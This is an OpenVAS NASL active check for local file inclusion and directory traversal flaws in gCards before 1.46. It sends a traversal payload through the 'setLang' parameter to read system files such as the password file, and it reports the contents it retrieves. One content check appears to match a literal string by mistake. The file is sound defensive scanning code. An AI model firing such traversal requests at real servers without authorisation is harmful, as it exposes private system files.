###############################################################################
# OpenVAS Vulnerability Test
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2008 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80065");
  script_version("2022-12-08T10:12:32+0000");
  script_tag(name:"last_modification", value:"2022-12-08 10:12:32 +0000 (Thu, 08 Dec 2022)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
  script_xref(name:"OSVDB", value:"24016");
  script_xref(name:"OSVDB", value:"24017");
  script_xref(name:"OSVDB", value:"24018");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("gCards < 1.46 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2008 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"gCards is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"gCards fails to sanitize user input to the 'setLang' parameter
  in the 'inc/setLang.php' script which is called by 'index.php'.");

  script_tag(name:"impact", value:"An unauthenticated attacker may be able to exploit this issue to
  read arbitrary local files or execute code from local files subject to the permissions of the web
  server user id.

  There are also reportedly other flaws in the installed application, including a directory
  traversal issue that allows reading of local files as well as a SQL injection (SQLi) and a
  cross-site scripting (XSS) issue.");

  script_tag(name:"solution", value:"Update to version 1.46 or later.");

  script_xref(name:"URL", value:"http://retrogod.altervista.org/gcards_145_xpl.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17165");
  script_xref(name:"URL", value:"http://www.gregphoto.net/index.php/2006/03/27/gcards-146-released-due-to-security-issues/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/gcards", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/index.php");
  if (res !~ "^HTTP/1\.[01] 200" || !egrep(pattern: ">gCards</a> v.*Graphics by Greg gCards", string: res))
    continue;

  lang = "vuln-test";

  foreach pattern (keys(files)) {
    file = files[pattern];

    url = dir + "/index.php?setLang=" + lang + "&lang[" + lang +
                "][file]=../../../../../../../../../../../../" + file;

    req = http_get(item: url, port: port);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
    if (!res)
      continue;

    if (egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
        (egrep(pattern: "root:.*:0:[01]:", string: res) ||
         egrep(pattern: "main\(inc/lang/.+/" + file + "\).+ failed to open stream: No such file or directory",
               string:res) ||
         egrep(pattern: "main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/" + file + "",
               string:res))) {
      if (egrep(pattern: "pattern", string: res))
        content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');

      if (content)
        report = 'It was possible to obtain the following content of the file ' + file + ' through ' +
                  http_report_vuln_url(port: port, url: url, url_only: TRUE) + ':\n\n' + content;
      else
        report = http_report_vuln_url(port: port, url: url);

      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
